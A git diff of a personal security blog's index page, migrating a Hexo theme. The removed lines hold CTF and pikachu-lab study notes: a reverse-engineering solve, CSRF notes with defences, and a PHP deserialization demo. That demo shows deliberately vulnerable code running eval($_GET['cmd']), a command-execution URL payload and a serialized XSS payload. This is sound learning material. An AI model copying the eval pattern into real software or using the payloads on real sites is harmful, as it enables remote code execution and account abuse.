@@ -1,1411 +1,753 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
+  <link rel="icon" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Sinky&#39;s Blog</title>
-
-  <!-- keywords -->
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sinky">
+  <meta name="keywords" content="">
   
-
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Sinky&#39;s Blog">
 <meta property="og:url" content="https://github.com/SinkyQ/SinkyQ.github.io.git/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
 <meta property="og:locale" content="en_US">
 <meta property="article:author" content="Sinky">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternative" href="/atom.xml" title="Sinky&#39;s Blog" type="application/atom+xml">
+<meta name="twitter:card" content="summary_large_image">
   
   
-    <link rel="icon" href="/img/favicon.ico">
   
-  
-<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/style.css">
+  <title>Sinky&#39;s Blog</title>
 
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight.css" />
   
+    <link id="highlight-css-dark" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight-dark.css" />
   
 
-  
-<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
 
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"github.com","root":"/SinkyQ/SinkyQ.github.io.git/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/SinkyQ/SinkyQ.github.io.git/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/SinkyQ/SinkyQ.github.io.git/js/utils.js" ></script>
+  <script  src="/SinkyQ/SinkyQ.github.io.git/js/color-schema.js" ></script>
   
-<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
 
 
   
 <meta name="generator" content="Hexo 6.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/SinkyQ/SinkyQ.github.io.git/atom.xml" title="Sinky's Blog" type="application/atom+xml">
 </head>
+
+
 <body>
-  <div id="container">
-    <div id="particles-js"></div>
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-	<header id="header" class="inner">
-		<a href="/" class="profilepic">
-			
-				<img lazy-src="" class="js-avatar">
-			
-		</a>
+  
 
-		<hgroup>
-			<h1 class="header-author"><a href="/">Sinky</a></h1>
-		</hgroup>
+  <header>
+    
 
-		
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/SinkyQ/SinkyQ.github.io.git/">
+      <strong>Sinky</strong>
+    </a>
 
-		<div class="switch-area">
-			<div class="switch-wrap">
-				<section class="switch-part switch-part1">
-					<nav class="header-menu">
-						<ul>
-						
-							<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
-				        
-							<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
-				        
-						</ul>
-					</nav>
-					<nav class="half-header-menu">
-						<a class="hide">Home</a>
-						<a>Tags</a>
-						<a>Links</a>
-						<a>About</a>
-					</nav>
-					<nav class="header-nav">
-						<div class="social">
-							
-						</div>
-						<!-- music -->
-						
-					</nav>
-				</section>
-				
-				
-				<section class="switch-part switch-part2">
-					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/SinkyQ/SinkyQ.github.io.git/tags/Buu/" style="font-size: 10px;">Buu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/RE/" style="font-size: 10px;">RE</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/Re/" style="font-size: 10px;">Re</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/bp/" style="font-size: 10px;">bp</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome-bug/" style="font-size: 13.33px;">chrome_bug</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 10px;">chrome调试</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/" style="font-size: 13.33px;">pikachu</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/web/" style="font-size: 10px;">web</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 13.33px;">学习笔记</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 10px;">漏洞战争</a> <a href="/SinkyQ/SinkyQ.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a>
-					</div>
-				</section>
-				
-				
-				
-				<section class="switch-part switch-part3">
-					<div id="js-friends">
-					
-			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
-			        
-			        </div>
-				</section>
-				
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-				
-				
-				<section class="switch-part switch-part4">
-				
-					<div id="js-aboutme">I&#39;m a developer.</div>
-				</section>
-				
-			</div>
-		</div>
-	</header>				
-</div>
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-  	<div class="overlay">
-  		<div class="slider-trigger"></div>
-  		<h1 class="header-author js-mobile-header hide"></h1>
-  	</div>
-	<div class="intrude-less">
-		<header id="header" class="inner">
-			<div class="profilepic">
-				<img lazy-src="" class="js-avatar">
-			</div>
-			<hgroup>
-			  <h1 class="header-author"></h1>
-			</hgroup>
-			
-			<nav class="header-menu">
-				<ul>
-				
-					<li><a href="/SinkyQ/SinkyQ.github.io.git/">Home</a></li>
-		        
-					<li><a href="/SinkyQ/SinkyQ.github.io.git/archives">Archives</a></li>
-		        
-		        <div class="clearfix"></div>
-				</ul>
-			</nav>
-			<nav class="header-nav">
-				<div class="social">
-					
-				</div>
-			</nav>
-		</header>				
-	</div>
+  </div>
 </nav>
-      <div class="body-wrap">
+
   
-    <article id="post-SimpleRev-buu-Re" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/10/SimpleRev-buu-Re/" class="article-date">
-  	<time datetime="2022-08-10T02:14:24.700Z" itemprop="datePublished">2022-08-10</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/SinkyQ/SinkyQ.github.io.git/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="心之所向，素履以往，生如逆旅，一苇以航"></span>
+          
+        </div>
+
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/10/SimpleRev-buu-Re/">
-        SimpleRev
-        
-      </a>
-    </h1>
-  
+      </div>
 
-      </header>
       
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>IDA打开查看字符串，直接点进<code>Congratulation</code>找到关键函数<code>Decry()</code></p>
-<p>浅分析一下</p>
-<pre><code class="__int64">{
-  char *v0; 
-  char v2; 
-  int v3; 
-  signed int v4; 
-  signed int i; 
-  signed int v6; 
-  char src[8]; 
-  __int64 v8; 
-  int v9; 
-  __int64 v10; 
-  __int64 v11; 
-  int v12; 
-  __int64 v13; 
-  v13 = *MK_FP(__FS__, 40LL);
-  *(_QWORD *)src = 'SLCDN';
-  v8 = 0LL;
-  v9 = 0;
-  v10 = 'wodah';
-  v11 = 0LL;
-  v12 = 0;
-  LODWORD(v0) = join(key3, &amp;v10); 
-// 小端序存储，v10要倒过来看：text=killshadow
-  text = v0;
-  strcpy(key, key1);  
-  strcat(key, src);  // key=ADSFKNDCLS
-  v3 = 0;
-  v4 = 0;
-  getchar();
-  v6 = strlen(key);
-// for循环是为了大写变小写
-  for ( i = 0; i &lt; v6; ++i )
-  {
-    if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 )
-      key[i] = key[v4 % v6] + 32;
-    ++v4;
-  }
-  printf("Please input your flag:", src);
-  while ( 1 )
-  {
-    v2 = getchar();
-    if ( v2 == 10 )
-      break;
-    if ( v2 == 32 )
-    {
-      ++v3;
-    }
-    else
-    {
-      if ( v2 &lt;= 96 || v2 &gt; 122 )
-      {
-        if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 )
-          str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97;
-      }
-      else
-      {
-        str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //核心代码
-      }
-      if ( !(v4 % v6) )
-        putchar(32);
-      ++v3;
-    }
-  }
-//经过加密后str2与text一致得到Congratulation，则加密前的str2就是flag
-  if ( !strcmp(text, str2) )
-    puts("Congratulation!\n");
-  else
-    puts("Try again!\n");
-  return *MK_FP(__FS__, 40LL) ^ v13;
-}
-</code></pre>
-<p>有取余，没法逆推，用爆破：</p>
-<pre><code>py脚本：
-key="ADSFKNDCLS"
-text="killshadow"
-s=""
-flag=""
-loop="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-v2 = 0
-v3 = 0
-v5 = len(key)
-for i in range(0,v5):
-    if ( ord(key[i]) &gt; 64 and ord(key[i]) &lt;= 90 ):
-        s += chr(ord(key[i]) + 32)
-    else:
-        s +=key[i]
-print(s)
-for i in range(0,len(text)):
-    for j in loop:
-        if ord(text[i])==(ord(j)-39-ord(s[i])+97)%26+97:
-            flag+=j
-print(flag)
-</code></pre>
-<pre><code class="C语言脚本"> #include&lt;stdio.h&gt; 
-int main()
-{
-    char key[] = "adsfkndcls";
-    char text[] = "killshadow";
-    int i;
-    int v3=10;//长度 
-    for (int i = 0; i &lt; 10; i++)
-    {
-        for (int j = 0; j &lt; 128; j++)
-        {
-            if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a')
-            {
-                continue;
-            }
-            if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i])
-            {
-                printf("%c",j);
-                v3++;
-                break;
-            }
-        }
-    }
-}
-</code></pre>
-<pre><code>flag{KLDQCUDFZO}
-</code></pre>
-
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
       
     </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/Buu/" rel="tag">Buu</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/Re/" rel="tag">Re</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
   </div>
-  
-</article>
+</div>
 
+</div>
 
+  </header>
 
-
-
-
-
-  
-    <article id="post-pikachu-PHP反序列化" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
-  	<time datetime="2022-08-09T09:01:18.129Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
+  <main>
     
-      <input type="hidden" class="isFancy" />
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        PHP反序列化
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/10/SimpleRev-buu-Re/" target="_self">
+          SimpleRev
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/10/SimpleRev-buu-Re/" target="_self">
+        <div>
+          IDA打开查看字符串，直接点进Congratulation找到关键函数Decry() 浅分析一下 Decry()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970{  char *v0;
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化 serialize()"></a>序列化 serialize()</h2><p>序列化：把一个对象变成可以传输的字符串。</p>
-<pre><code class="<?php">class S{
-public $test="pikachu";
-}
-$s=new S;//创建一个对象
-serialize($s);//把这个对象进行序列化
-?&gt;
-</code></pre>
-<p>结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}</p>
-<p>O:代表object</p>
-<p>1:代表对象名字长度为一个字符</p>
-<p>S:对象的名称</p>
-<p>1:代表对象里面有一个变量</p>
-<p>s:数据类型</p>
-<p>4:变量名称的长度</p>
-<p>test:变量名称</p>
-<p>s:数据类型</p>
-<p>7:变量值的长度</p>
-<p>pikachu:变量值</p>
-<p>（什么鬼，没懂）</p>
-<h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p>
-<pre><code>$u=unserialize("0:1:"S":1{s:4:"test":s:7:"pikachu";}");
-echo $u ‐&gt; test;//得到结果为pikachu
-</code></pre>
-<p>序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p>
-<p><img src="https://s2.loli.net/2022/08/09/LkvmjC2rTAON7Pi.png" alt="image.png"></p>
-<ul>
-<li>常见的魔法函数：<ul>
-<li><em>__construct()</em> 当一个对象创建时被调用</li>
-<li><em>__destruct()</em> 当一个对象销毁时被调用</li>
-<li><em>__toString()</em> 当一个对象被当作一个字符串使用</li>
-<li><em>__sleep()</em> 在对象在被序列化之前运行</li>
-<li><em>__wakeuop</em> 将在序列化之后立即被调用</li>
-</ul>
-</li>
-</ul>
-<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><pre><code class="<?php">//定义类
-class test
-{
-//在对象被销毁时候自动调用destruct函数
-function __destruct()
-{
-echo "&lt;br&gt;__destruct()&lt;br&gt;";
-//在此函数中添加eval()以达到命令执行的目的
-eval($_GET['cmd']);
-}
-}
-//echo serialize($test);方便将序列化后的test写进u参数中传参
-$test = new test;
-echo serialize($test);
-//执行完这个echo后会被垃圾回收器回收，也就是销毁
-unserialize($_GET['u']);
-//反序列化执行完后又会被回收
-// 所以会出现两次destruct
-?&gt;
-</code></pre>
-<p><img src="https://s2.loli.net/2022/08/09/obFRtxqgIyXBO9k.png" alt="image.png"></p>
-<p>传参: <code>http://localhost/phptest.php?O:4:"test":0:{}&amp;cmd=system("woami");</code></p>
-<p>利用成功。</p>
-<h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p><img src="https://s2.loli.net/2022/08/09/cl6J2puye5PkzTL.png" alt="image.png"></p>
-<p>随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的”</p>
-<p>提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。</p>
-<p><img src="https://s2.loli.net/2022/08/09/F58nRZDKNG4VSXi.png" alt="image.png"></p>
-<p>将XSS字符串 <code>&lt;script&gt;alert('xss')&lt;/script&gt; </code>序列化一下： <code>O:1:"S":1:{s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";}</code></p>
-<p>提交，成功</p>
-<p><img src="https://s2.loli.net/2022/08/09/TVb9AHiwgLo812t.png" alt="image.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/" rel="tag">pikachu</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-10 10:14" pubdate>
+              2022-08-10
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/Re/">#Re</a>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/Buu/">#Buu</a>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/CTF/">#CTF</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-pikachu-CSRF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-CSRF/" class="article-date">
-  	<time datetime="2022-08-09T08:30:06.517Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-CSRF/">
-        pikachu-CSRF
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_self">
+          PHP反序列化
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_self">
+        <div>
+          概述序列化 serialize()序列化：把一个对象变成可以传输的字符串。 123456class S{public $test&#x3D;&quot;pikachu&quot;;}$s&#x3D;new S;&#x2F;&#x2F;创建一个对象serialize($s);&#x2F;&#x2F;把这个对象进行序列化?&gt;  结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;} O:代表object 1:代表对象名字长度为一个字符 S:对象的名
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p>
-<h2 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h2><p>1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p>
-<p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p>
-<h2 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h2><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p>
-<h2 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h2><p>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p>
-<ul>
-<li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li>
-<li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li>
-</ul>
-<p>2.确认凭证的有效期</p>
-<ul>
-<li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li>
-</ul>
-<h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录账号，抓取修改个人信息流量包。</p>
-<p><img src="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png" alt="image.png"></p>
-<p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p>
-<p>可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。</p>
-<p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p>
-<p>步骤同get。</p>
-<p>正常登录状态：</p>
-<p><img src="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png" alt="image.png"></p>
-<p>点击恶意url后，用户信息直接被修改</p>
-<p><img src="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png" alt="image.png"></p>
-<h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h1><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p>
-<p>如图获取修改信息流量包后发现增加了token，无法利用。</p>
-<p><img src="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png" alt="image.png"></p>
-<h1 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h1><ul>
-<li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li>
-<li>安全的会话管理（避免会话被利用）<ul>
-<li>不要再客户端保存敏感信息（身份认证信息）</li>
-<li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li>
-</ul>
-</li>
-<li>访问控制安全管理<ul>
-<li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li>
-<li>敏感信息的修改尽量使用post（post安全性高于get）</li>
-<li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li>
-</ul>
-</li>
-<li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pikachu/" rel="tag">pikachu</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 17:01" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
